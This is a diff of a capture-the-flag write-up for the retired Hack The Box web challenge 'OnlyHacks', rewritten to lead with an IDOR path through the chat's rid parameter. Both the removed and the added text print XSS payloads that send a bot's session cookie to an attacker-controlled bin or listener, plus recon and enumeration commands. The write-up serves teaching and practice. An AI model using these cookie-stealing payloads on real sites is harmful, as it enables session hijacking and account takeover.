@@ -4,44 +4,69 @@ category: Web
 difficulty: Very Easy
 platform: Hack The Box
 state: Retired
-tags: [web, xss, cookie-stealing, session-hijack, flask]
+tags: [web, idor, xss, flask, bot]
+type: Web
 ---
 
 # OnlyHacks — Hack The Box
 
 **English** | [🇪🇸 Español](README.md)
 
-> **State:** Retired. Methodology notes; no real flags.
+> **State:** Retired. Analysis notes; the flag is not published.
 
-## TL;DR
+## Brief
 
-A dating app with chat. Messages are **not sanitised**: stored XSS. A bot holding an admin session reviews the conversation every few seconds, so a payload that sends `document.cookie` to a request bin hands over her **Flask session cookie**; swap it and you are in her account.
+A social network for "hackers" with open registration. The goal is the flag, and the hint lies in the private messaging between users.
 
-## Evidence
+## Recon
 
-- A web instance (register with username, password and avatar).
-
-## Method
-
-1. **Register**: create an account and upload an avatar (otherwise registration complains about a duplicate user).
-2. **Confirm the XSS**: send `<img src=x onerror=alert(1)>` in the chat; if the dialog pops in your own browser, it executes.
-3. **Steal the cookie**: stand up an endpoint (RequestBin/Pipedream) and send
-
-```html
-<img src="x" onerror="fetch('https://<your-bin>/?c='+document.cookie)">
+```bash
+gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-4. **Wait for the bot**: the admin replies on a timer; when she renders the message, the request reaches the bin with `session=<base64>.<signature>`.
-5. **Impersonate**: DevTools → Application → Cookies, replace your session with the stolen one and reload; her conversation holds the flag.
+Typical routes for this challenge: `/register`, `/login`, `/dashboard`, `/profile`, `/chat`, `/report`. The app is **Flask** with a signed-cookie session.
 
-## Pitfalls
+## Main path: IDOR in the chat
 
-- **httpOnly cookie**: an `httpOnly` cookie could not be read by JavaScript; this one is not.
-- **Slow bot**: 5-10 seconds per cycle; do not resend the payload in a loop.
-- **Flask signature**: the cookie base64-decodes, but without the `SECRET_KEY` it cannot be forged; steal it, do not build it.
+The thread identifier travels in the URL:
+
+```text
+/chat?rid=2      -> your own conversation
+/chat?rid=3      -> someone else's conversation
+```
+
+Changing `rid` by hand returns the other thread without an ownership check: plain **IDOR**. The flag sits inside user `Dimitris`'s conversation, in the clear, with nothing else to exploit.
+
+```bash
+for i in $(seq 1 10); do
+  curl -s -b "session=<cookie>" "http://<IP>:<PORT>/chat?rid=$i" | grep -o "HTB{[^}]*}"
+done
+```
+
+> Order matters: the IDOR is the documented path. The old writeup offered it as an alternative to the XSS and got the weight of the two backwards.
+
+## Alternative path: XSS against the bot
+
+The challenge ships a "report profile" button that a bot named **Renata** visits. If the profile reflects the field unescaped, the XSS runs in the bot's browser; the goal would be exfiltrating its session cookie to a listener of your own.
+
+```html
+<script>new Image().src="http://<LHOST>:8000/?c="+document.cookie</script>
+```
+
+```bash
+python3 -m http.server 8000
+```
+
+It works as a secondary route but is more fragile: it depends on the bot visiting the profile and on the cookie policy. This challenge does not require it.
+
+## Findings
+
+- **IDOR** through a numeric parameter: the flaw is not checking that the thread belongs to the session user.
+- The XSS against the bot is a real but incidental path here.
+- Private messaging is a classic target: it concentrates information the rest of the app never shows.
 
 ## Lessons
 
-- Stored XSS plus a privileged bot is account takeover, not just a popup.
-- Session cookies without `httpOnly` are readable by JavaScript.
-- A `fetch` to an external domain exfiltrates data without needing images.
+- Enumerating sequential identifiers is the first access-control test.
+- A `?rid=` accepting any integer is an open door.
+- Mitigation: per-object authorisation on the server, unpredictable IDs, and output escaping plus CSP against XSS.
